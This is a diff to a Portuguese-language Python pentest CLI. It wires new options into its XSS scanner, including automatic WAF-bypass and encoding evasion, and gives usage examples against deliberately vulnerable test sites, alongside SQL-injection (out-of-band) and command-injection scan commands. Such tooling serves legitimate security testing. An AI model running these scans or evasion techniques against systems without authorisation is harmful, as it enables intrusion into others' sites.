+def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, enable_bypasses=True, context_analysis=True, validate_execution=True, analyze_csp=True, verbose=False):
+    scanner = XSSScanner(url, custom_payloads_file=custom_payloads_file, scan_stored=scan_stored, fuzz_dom=fuzz_dom)
+    scanner.enable_bypasses = enable_bypasses
+    scanner.context_analysis = context_analysis  
+    scanner.validate_execution = validate_execution
+    scanner.analyze_csp = analyze_csp
+    scanner.verbose = verbose
+    scanner.run_scan()
 
 # --- MÓDULO 16: SCANNER DE INJEÇÃO DE COMANDOS ---
 
@@ -3437,8 +4113,14 @@ Exemplos de Uso:
   # Executa um scan OAST (Out-of-Band) para confirmação definitiva de SQLi (requer nível 3)
   python %(prog)s sql-scan -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --level 3 --collaborator-url "seu-dominio.oast.me"
 
-  # Procura por falhas de XSS (Refletido e Armazenado) usando uma lista de payloads
-  python %(prog)s xss-scan -u "http://testphp.vulnweb.com/guestbook.php" --custom-payloads payloads/xss.txt --scan-stored
+  # Scan XSS básico com detecção context-aware e bypass automático
+  python %(prog)s xss-scan -u "http://testphp.vulnweb.com/guestbook.php"
+  
+  # Scan XSS completo com stored XSS e payloads personalizados
+  python %(prog)s xss-scan -u "http://testphp.vulnweb.com/guestbook.php" --scan-stored --custom-payloads payloads/xss.txt
+  
+  # Scan XSS avançado com modo verbose para análise detalhada
+  python %(prog)s xss-scan -u "http://xss-game.appspot.com/level1/frame" --verbose --scan-stored
 
   # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
   python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache
@@ -3479,11 +4161,16 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_sql.add_argument('--dbms', help='Força o uso de payloads para um DBMS específico (ex: mysql, mssql, oracle).')
     parser_sql.add_argument('--collaborator-url', help='URL do servidor OAST (ex: Burp Collaborator) para testes Out-of-Band.')
 
-    parser_xss = subparsers.add_parser('xss-scan', help='[Scan] Procura por falhas de Cross-Site Scripting (XSS).')
+    parser_xss = subparsers.add_parser('xss-scan', help='[Scan] Scanner XSS avançado com detecção context-aware, bypass de WAF e análise de CSP.')
     parser_xss.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
-    parser_xss.add_argument('--custom-payloads', help='Caminho para um ficheiro com payloads de XSS personalizados (um por linha).')
-    parser_xss.add_argument('--scan-stored', action='store_true', help='Ativa a verificação de XSS Armazenado (Stored).')
-    parser_xss.add_argument('--fuzz-dom', action='store_true', help='Ativa a análise de XSS baseado em DOM (funcionalidade futura).')
+    parser_xss.add_argument('--custom-payloads', help='Caminho para ficheiro com payloads XSS personalizados (um por linha). Se não especificado, usa base de 150+ payloads categorizados.')
+    parser_xss.add_argument('--scan-stored', action='store_true', help='Ativa verificação de XSS Armazenado (Stored) com análise aprimorada de formulários e CSRF.')
+    parser_xss.add_argument('--fuzz-dom', action='store_true', help='[FUTURO] Ativa análise de XSS baseado em DOM usando headless browser.')
+    parser_xss.add_argument('--enable-bypasses', action='store_true', default=True, help='Ativa técnicas de bypass automáticas (encoding, WAF evasion). Padrão: ativado.')
+    parser_xss.add_argument('--context-analysis', action='store_true', default=True, help='Ativa detecção context-aware (HTML, atributos, JavaScript, CSS). Padrão: ativado.')
+    parser_xss.add_argument('--validate-execution', action='store_true', default=True, help='Ativa validação de execução JavaScript através de análise de resposta. Padrão: ativado.')
+    parser_xss.add_argument('--analyze-csp', action='store_true', default=True, help='Ativa análise de Content Security Policy (CSP). Padrão: ativado.')
+    parser_xss.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas sobre contextos detectados, WAFs e técnicas de bypass.')
 
 
     parser_cmd = subparsers.add_parser('cmd-scan', help='[Scan] Procura por falhas de Injeção de Comandos.')
@@ -3623,7 +4310,15 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     elif args.tool == 'sql-scan':
         sql_injection_scan(args.url, args.level, args.dbms, args.collaborator_url)
     elif args.tool == 'xss-scan':
-        xss_scan(args.url, custom_payloads_file=args.custom_payloads, scan_stored=args.scan_stored, fuzz_dom=args.fuzz_dom)
+        xss_scan(args.url, 
+                custom_payloads_file=args.custom_payloads, 
+                scan_stored=args.scan_stored, 
+                fuzz_dom=args.fuzz_dom,
+                enable_bypasses=getattr(args, 'enable_bypasses', True),
+                context_analysis=getattr(args, 'context_analysis', True),
+                validate_execution=getattr(args, 'validate_execution', True),
+                analyze_csp=getattr(args, 'analyze_csp', True),
+                verbose=getattr(args, 'verbose', False))
     elif args.tool == 'cmd-scan':
         command_injection_scan(args.url)
     elif args.tool == 'lfi-scan':
